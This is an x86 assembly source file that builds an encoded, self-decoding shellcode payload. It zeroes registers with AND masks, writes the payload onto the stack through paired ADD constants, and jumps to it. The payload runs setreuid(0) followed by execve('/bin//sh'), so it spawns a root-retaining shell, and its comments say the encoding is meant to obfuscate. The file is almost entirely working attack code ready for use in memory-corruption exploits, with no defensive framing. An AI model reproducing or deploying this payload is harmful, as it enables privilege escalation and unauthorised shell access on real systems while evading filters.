; \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
global _start                   

section .text

_start:

; set EAX to 0    
AND EAX, 0xC8D9EA45
AND EAX, 0x372615BA

; locate me in the stack
PUSH ESP
POP EAX

; reserve enough space into the stack

ADD AX, 0x964
PUSH EAX
POP ESP
MOV EBX, ESP


; write my shellcode into the stack as ADD instructions
; \x31\xc0\x50\x68
; \x2f\x2f\x73\x68
; \x68\x2f\x62\x69
; \x6e\x89\xe3\x31
; \xc9\x31\xd2\xb0
; \x0b\xcd\x80 -> I will pad this one with \x90

; zero EAX with different numbers to obfuscate further
AND EAX, 0x93fa3245
AND EAX, 0x6C05CDBA

; targe result is \x90\x80\xcd\x0b
; choose a random 32 word: 0x6574bead
; calculate 0x9080cd0b-0x6574bead=0x2B0C0E5E
ADD EAX, 0x6574bead
ADD EAX, 0x2B0C0E5E
PUSH EAX
SUB EBX, 4

AND EAX, 0x93fa3245
AND EAX, 0x6C05CDBA
; \xb0\xd2\x31\xc9
ADD EAX, 0xae456737
ADD EAX, 0x028CCA92
PUSH EAX
SUB EBX, 4

AND EAX, 0x93fa3245
AND EAX, 0x6C05CDBA

; \x31\xe3\x89\x6e
ADD EAX, 0x229AB0AA
ADD EAX, 0x0F48D8C4
PUSH EAX
SUB EBX, 4

AND EAX, 0x93fa3245
AND EAX, 0x6C05CDBA
; \x69\x62\x2f\x68
ADD EAX, 0x45AB12FF
ADD EAX, 0x23B71C69
PUSH EAX
SUB EBX, 4

AND EAX, 0x93fa3245
AND EAX, 0x6C05CDBA
; \x68\x73\x2f\x2f
ADD EAX, 0x3291FFAA
ADD EAX, 0x35E12F85
PUSH EAX
SUB EBX, 4

AND EAX, 0x93fa3245
AND EAX, 0x6C05CDBA
; \x68\x50\xc0\x31
ADD EAX, 0x45AFEDBA
ADD EAX, 0x22A0D277
PUSH EAX
SUB EBX, 4

; adding setreuid(0)
; \x31\xc9\xf7\xe1
; \x89\xc3\xb0\x46
; \xcd\x80

AND EAX, 0x9023F212
AND EAX, 0x6FDC0DED
; \x90\x90\x80\xcd
ADD EAX, 0x36F7B189
ADD EAX, 0x5998CF44
PUSH EAX
SUB EBX, 4

AND EAX, 0x17ab3298
AND EAX, 0xE854CD67
; \x46\xb0\xc3\x89
ADD EAX, 0x34F2A4B1
ADD EAX, 0x11BE1ED8
PUSH EAX
SUB EBX, 4

AND EAX, 0x63DD23FC
AND EAX, 0x9C22DC03
; \xe1\xf7\xc9\x31
ADD EAX, 0xc248af21
ADD EAX, 0x1FAF1A10
PUSH EAX
SUB EBX, 4



JMP EBX
